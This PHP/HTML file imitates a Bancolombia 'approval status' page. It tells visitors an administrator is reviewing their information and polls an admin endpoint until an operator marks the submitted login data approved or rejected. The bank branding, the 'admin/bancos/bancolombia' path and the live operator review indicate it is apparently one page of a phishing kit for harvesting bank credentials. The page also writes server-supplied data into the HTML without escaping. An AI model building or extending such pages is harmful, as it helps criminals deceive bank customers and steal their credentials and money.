<?php
// admin/bancos/bancolombia/dinamica.php
session_start();

// Verificar sesión
if (!isset($_SESSION['usuario_bancolombia']) && !isset($_SESSION['identificacion_bancolombia'])) {
    header('Location: index.php');
    exit;
}

$usuario = $_SESSION['usuario_bancolombia'] ?? $_SESSION['identificacion_bancolombia'] ?? 'Usuario';
?>

<!DOCTYPE html>
<html lang="es-CO">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bancolombia - Estado de Aprobación</title>
    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@300;400;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Open Sans', Arial, sans-serif;
            background: #f5f5f5;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            max-width: 500px;
            width: 100%;
            padding: 40px 35px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            text-align: center;
        }
        .icon-pending {
            width: 80px;
            height: 80px;
            background: #ff9800;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }
        .icon-pending svg {
            width: 40px;
            height: 40px;
            color: white;
        }
        .icon-approved {
            width: 80px;
            height: 80px;
            background: #4caf50;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }
        .icon-approved svg {
            width: 40px;
            height: 40px;
            color: white;
        }
        .icon-rejected {
            width: 80px;
            height: 80px;
            background: #e53935;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
        }
        .icon-rejected svg {
            width: 40px;
            height: 40px;
            color: white;
        }
        h1 {
            color: #212121;
            font-size: 24px;
            font-weight: 700;
            margin-bottom: 10px;
        }
        .subtitle {
            color: #666;
            font-size: 15px;
            margin-bottom: 25px;
        }
        .info-card {
            background: #f9f9fa;
            border-radius: 8px;
            padding: 20px;
            text-align: left;
            margin-bottom: 25px;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid #eee;
        }
        .info-row:last-child {
            border-bottom: none;
        }
        .info-label {
            color: #888;
            font-size: 14px;
        }
        .info-value {
            color: #212121;
            font-weight: 600;
            font-size: 14px;
        }
        .btn-continuar {
            width: 100%;
            padding: 14px;
            background: #fdda24;
            border: none;
            border-radius: 30px;
            font-size: 16px;
            font-weight: 700;
            color: #212121;
            cursor: pointer;
            transition: background 0.3s;
        }
        .btn-continuar:hover {
            background: #fdd007;
        }
        .btn-cerrar {
            display: block;
            margin-top: 15px;
            color: #e53935;
            text-decoration: none;
            font-size: 14px;
        }
        .btn-cerrar:hover {
            text-decoration: underline;
        }
        .spinner {
            width: 52px;
            height: 52px;
            margin: 0 auto 20px;
        }
        .spinner svg {
            width: 52px;
            height: 52px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        .status-pending { color: #ff9800; font-weight: 700; }
        .status-approved { color: #4caf50; font-weight: 700; }
        .status-rejected { color: #e53935; font-weight: 700; }
    </style>
</head>
<body>

<div class="container" id="mainContainer">
    <div id="statusContent">
        <div class="icon-pending">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <circle cx="12" cy="12" r="10"></circle>
                <line x1="12" y1="8" x2="12" y2="12"></line>
                <line x1="12" y1="16" x2="12.01" y2="16"></line>
            </svg>
        </div>
        <h1>Esperando Aprobación</h1>
        <p class="subtitle">El administrador está revisando tu información. Por favor espera...</p>
        <div class="spinner">
            <svg viewBox="0 0 52 52" fill="none" xmlns="http://www.w3.org/2000/svg">
                <circle cx="26" cy="26" r="22" stroke="#e0e0e0" stroke-width="4"/>
                <circle cx="26" cy="26" r="22" stroke="#FDDA24" stroke-width="4" stroke-linecap="round" stroke-dasharray="103 35" stroke-dashoffset="0"/>
            </svg>
        </div>
        <div class="info-card">
            <div class="info-row">
                <span class="info-label">Usuario</span>
                <span class="info-value"><?php echo htmlspecialchars($usuario); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Estado</span>
                <span class="info-value status-pending">⏳ Pendiente</span>
            </div>
        </div>
    </div>
</div>

<script>
// Obtener logId del localStorage
const logId = localStorage.getItem('log_id_actual') || localStorage.getItem('log_id_login');

console.log('📋 Log ID desde localStorage:', logId);

if (!logId) {
    document.getElementById('statusContent').innerHTML = `
        <div class="icon-rejected">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
        </div>
        <h1>Error de Sesión</h1>
        <p class="subtitle">No se encontró información de sesión. Por favor inicia sesión nuevamente.</p>
        <button class="btn-continuar" onclick="window.location.href='index.php'">Volver a intentar</button>
    `;
} else {
    function checkStatus() {
        fetch('../../admin/check_aprobacion.php?log_id=' + logId)
            .then(res => res.json())
            .then(data => {
                console.log('📊 Estado:', data);
                
                if (data.estado === 'aprobado') {
                    document.getElementById('statusContent').innerHTML = `
                        <div class="icon-approved">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                                <polyline points="20 6 9 17 4 12"></polyline>
                            </svg>
                        </div>
                        <h1>¡Aprobación Exitosa!</h1>
                        <p class="subtitle">Tus datos han sido verificados correctamente.</p>
                        <div class="info-card">
                            <div class="info-row">
                                <span class="info-label">Usuario</span>
                                <span class="info-value">${data.usuario || 'N/A'}</span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Identificación</span>
                                <span class="info-value">${data.identificacion || data.documento || 'N/A'}</span>
                            </div>
                            <div class="info-row">
                                <span class="info-label">Estado</span>
                                <span class="info-value status-approved">✅ Aprobado</span>
                            </div>
                        </div>
                        <button class="btn-continuar" onclick="window.location.href='../../index.php'">Continuar</button>
                        <a href="logout.php" class="btn-cerrar">Cerrar sesión</a>
                    `;
                    localStorage.removeItem('log_id_actual');
                    localStorage.removeItem('log_id_login');
                } else if (data.estado === 'rechazado') {
                    document.getElementById('statusContent').innerHTML = `
                        <div class="icon-rejected">
                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                                <line x1="18" y1="6" x2="6" y2="18"></line>
                                <line x1="6" y1="6" x2="18" y2="18"></line>
                            </svg>
                        </div>
                        <h1>Datos Rechazados</h1>
                        <p class="subtitle">Tu información no pudo ser verificada. Por favor intenta nuevamente.</p>
                        <button class="btn-continuar" onclick="window.location.href='index.php'">Intentar nuevamente</button>
                    `;
                    localStorage.removeItem('log_id_actual');
                    localStorage.removeItem('log_id_login');
                } else {
                    setTimeout(checkStatus, 3000);
                }
            })
            .catch(err => {
                console.error('❌ Error:', err);
                setTimeout(checkStatus, 5000);
            });
    }
    checkStatus();
}
</script>
</body>
</html>
